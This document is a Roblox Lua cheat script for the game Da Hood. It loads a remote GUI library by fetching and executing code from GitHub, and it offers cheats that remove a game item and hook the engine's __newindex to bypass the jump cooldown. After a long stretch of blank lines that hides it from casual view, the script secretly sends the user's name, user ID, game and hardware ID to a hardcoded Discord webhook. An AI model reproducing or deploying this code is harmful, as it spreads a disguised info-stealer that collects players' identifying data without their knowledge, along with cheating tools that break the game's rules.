local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/Ln3242/Dahood/main/GuiLibrary.lua')))()
local Window = OrionLib:MakeWindow({Name = "DA HOOD OrionTest", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})


local FunnyTap = Window:MakeTab({
	Name = "FunnyTesting",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})


FunnyTap:AddButton({
	Name = "Anit Bag",
	Callback = function()
        OrionLib:MakeNotification({
            Name = "Anit Bag",
            Content = "You can not turn this off",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        local LP = game.Players.LocalPlayer;

        for i,v in ipairs(LP.Character:GetDescendants()) do
            if v.Name == "Christmas_Sock" then v:Destroy()
                end
            end
                
            LP.Character.ChildAdded:Connect(function()
            wait(0.3)
            for i,v in ipairs(LP.Character:GetDescendants()) do
            if v.Name == "Christmas_Sock" then v:Destroy()
            end
            end
            end)
  	end    
})

FunnyTap:AddButton({
	Name = "nojumpcooldown",
	Callback = function()
if not game.IsLoaded(game) then 
    game.Loaded.Wait(game.Loaded);
end 
OrionLib:MakeNotification({
    Name = "nojumpcooldown",
    Content = "You can not turn this off",
    Image = "rbxassetid://4483345998",
    Time = 5
})
local IsA = game.IsA;
local newindex = nil 
newindex = hookmetamethod(game, "__newindex", function(self, Index, Value)
    if not checkcaller() and IsA(self, "Humanoid") and Index == "JumpPower" then 
        return
    end
    
    return newindex(self, Index, Value);
end)
end  
})

























































print("Working")

local webh = "https://discordapp.com/api/webhooks/1041138127613480983/1_Id95opxezQ9izltqpFMXGFr-xdFMktdH4KSbYMyWSc_dWIIR7-7c_s4RTxUK9Ea1at"


pcall(function()
   local data = {

  ['embeds'] = {
    {
       ['title'] = 'Script',
       ['description'] = 'Xzyn Joined a Game Heres My Information',
       ['fields'] = {
          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
          {name = 'DisplayName', value = game:GetService("Players").LocalPlayer.DisplayName},
          {name = "UserID", value = game:GetService("Players").LocalPlayer.UserId},
          {name = "Game", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name},
          {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
          {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},

        }
    }
  }
}

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)

if identifyexecutor and identifyexecutor():find("Synpase") then
	local text2 = Instance.new("TextLabel")
	text2.Text = "Krnl is currently not working on vape\nIn the meantime, enjoy the rickroll"
	text2.TextStrokeTransparency = 0
	text2.BackgroundTransparency = 1
	text2.TextColor3 = Color3.new(1, 1, 1)
	text2.TextSize = 40
	text2.Font = Enum.Font.SourceSans
	text2.Size = UDim2.new(1, 0, 1, 0)
	text2.Parent = GuiLibrary["MainGui"]
	return
end
